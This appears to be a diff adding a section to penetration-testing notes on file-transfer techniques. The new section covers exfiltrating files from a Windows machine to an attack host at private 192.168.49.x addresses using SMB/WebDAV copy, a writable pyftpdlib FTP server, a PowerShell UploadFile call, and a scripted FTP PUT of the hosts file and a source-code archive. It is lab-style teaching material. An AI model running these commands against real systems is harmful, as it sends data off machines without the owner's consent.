@@ -294,3 +294,52 @@ dir \\192.168.49.128\DavWWWRoot
 {% endcode %}
 
 <figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption><p>DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder</p></figcaption></figure>
+
+### **Uploading Files using SMB**
+
+{% code overflow="wrap" %}
+```
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption><p>If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.</p></figcaption></figure>
+
+### FTP Uploads
+
+```
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption><p> You need to specify the option <code>--write</code> to allow clients to upload files to our attack host</p></figcaption></figure>
+
+### **PowerShell Upload File**
+
+{% code overflow="wrap" %}
+```
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+
+### **Command File for FTP Client to Upload File**
+
+{% code overflow="wrap" %}
+```
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
